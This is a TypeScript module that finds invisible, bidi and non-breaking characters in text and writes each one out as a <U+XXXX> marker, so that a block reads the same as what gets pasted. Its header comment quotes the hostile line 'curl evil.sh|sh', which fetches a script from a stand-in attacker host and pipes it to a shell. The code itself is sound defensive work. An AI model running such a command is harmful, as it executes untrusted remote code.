// Characters a text box does not draw as themselves (#2615) — controls it draws as nothing, zero-width,
// format and default-ignorable characters (variation selectors, the tag block, Hangul fillers), bidi
// controls that reorder what is around them, and blanks that do not break a line (a run of them pushes
// the rest of the line out of sight). With them a line can read `true; #;curl evil.sh|sh` and paste as
// `true; curl evil.sh|sh;# `, so a block shown before it is copied writes each one out as `<U+XXXX>`.
//
// Decided by Unicode property rather than a list of ranges, which missed whole classes. Left alone:
// space, tab, newline, CRLF, an ideographic space or two, and the joiner and selector inside an emoji (`❤️`, a ZWJ family), which a
// text box draws as the emoji — flagging those would make the warning cry wolf on ordinary text.
//
// Pure: text in, the text with each one written out and how many there were out.

// Unassigned code points (Cn) and the object-replacement character are drawn as blanks by some
// fonts, so a run of them hides what follows as well as a run of no-break spaces does.
const INVISIBLE = /[\p{Cc}\p{Cf}\p{Cn}\p{Zs}\p{Zl}\p{Zp}\p{Co}\p{Default_Ignorable_Code_Point}\u2800\uFFFC]/u;
const PICTOGRAPHIC = /[\p{Extended_Pictographic}\p{Emoji_Modifier}]/u;
const KEYCAP_BASE = /[0-9#*]/;
const DRAWN_AS_ITSELF = new Set([" ", "\t", "\n"]);
// The ideographic space is in every other Japanese sentence, one or two at a time — but Safari wraps a
// long run of it as blank lines. A run longer than prose uses is flagged; shorter runs mixed with
// spaces can still push text down there, which the dialog's "continues below" note covers.
const IDEOGRAPHIC_SPACE = "\u3000";
const MAX_IDEOGRAPHIC_SPACES = 2;
const PRESENTATION_SELECTORS = new Set(["\uFE0E", "\uFE0F"]);
const ZERO_WIDTH_JOINER = "\u200D";
const JOINERS = new Set(["\u200C", ZERO_WIDTH_JOINER]);
// Scripts whose words use ZWNJ / ZWJ between letters (Persian, Urdu, the Indic scripts, …). One such
// joiner between two letters or marks of the same one is part of the word, and it cannot split a shell
// word. Script_EXTENSIONS, so a vowel sign or hamza before it (Inherited as a Script) still counts;
// the joiners themselves belong to none, so two in a row are still flagged.
const LETTER_OR_MARK = /[\p{L}\p{M}]/u;
const JOINING_SCRIPTS = [
  /\p{scx=Arabic}/u,
  /\p{scx=Syriac}/u,
  /\p{scx=Thaana}/u,
  /\p{scx=Nko}/u,
  /\p{scx=Mongolian}/u,
  /\p{scx=Devanagari}/u,
  /\p{scx=Bengali}/u,
  /\p{scx=Gurmukhi}/u,
  /\p{scx=Gujarati}/u,
  /\p{scx=Oriya}/u,
  /\p{scx=Tamil}/u,
  /\p{scx=Telugu}/u,
  /\p{scx=Kannada}/u,
  /\p{scx=Malayalam}/u,
  /\p{scx=Sinhala}/u,
];

/** A selector right after its emoji, or a joiner between two (past one selector) — drawn as the emoji.
 *  Only ONE selector is ever part of an emoji, so a second one after it is hidden like any other. */
function isPartOfEmoji(characters: string[], index: number): boolean {
  const character = characters[index] ?? "";
  const before = characters[index - 1] ?? "";
  if (PRESENTATION_SELECTORS.has(character)) return PICTOGRAPHIC.test(before) || KEYCAP_BASE.test(before);
  if (character !== ZERO_WIDTH_JOINER) return false;
  const base = PRESENTATION_SELECTORS.has(before) ? (characters[index - 2] ?? "") : before;
  return PICTOGRAPHIC.test(base) && PICTOGRAPHIC.test(characters[index + 1] ?? "");
}

/** A single joiner inside a word of a script that writes with them. */
function isJoinerInWord(characters: string[], index: number): boolean {
  if (!JOINERS.has(characters[index] ?? "")) return false;
  const [before, after] = [characters[index - 1] ?? "", characters[index + 1] ?? ""];
  if (!LETTER_OR_MARK.test(before) || !LETTER_OR_MARK.test(after)) return false;
  return JOINING_SCRIPTS.some((script) => script.test(before) && script.test(after));
}

/** The positions of ideographic spaces in a run longer than prose uses. */
function longIdeographicRuns(characters: string[]): Set<number> {
  const runs = characters.reduce<number[][]>((found, character, index) => {
    if (character !== IDEOGRAPHIC_SPACE) return found;
    const current = found.at(-1);
    if (current && current.at(-1) === index - 1) current.push(index);
    else found.push([index]);
    return found;
  }, []);
  return new Set(runs.filter((run) => run.length > MAX_IDEOGRAPHIC_SPACES).flat());
}

function isHiddenAt(characters: string[], index: number, longRuns: Set<number>): boolean {
  const character = characters[index] ?? "";
  if (DRAWN_AS_ITSELF.has(character)) return false;
  if (character === IDEOGRAPHIC_SPACE) return longRuns.has(index);
  // A CR alone is drawn as a line break but pasted as Enter; in CRLF it is part of the line ending.
  if (character === "\r") return characters[index + 1] !== "\n";
  return INVISIBLE.test(character) && !isPartOfEmoji(characters, index) && !isJoinerInWord(characters, index);
}
const HEX_DIGITS = 4;
const marker = (character: string): string => `<U+${(character.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(HEX_DIGITS, "0")}>`;

export interface RevealedText {
  /** The text with every hidden character written as `<U+XXXX>`. */
  shown: string;
  hidden: number;
}

export function revealHidden(text: string): RevealedText {
  const characters = [...text];
  const longRuns = longIdeographicRuns(characters);
  const hiddenAt = characters.map((_, index) => isHiddenAt(characters, index, longRuns));
  return {
    shown: characters.map((character, index) => (hiddenAt[index] ? marker(character) : character)).join(""),
    hidden: hiddenAt.filter(Boolean).length,
  };
}
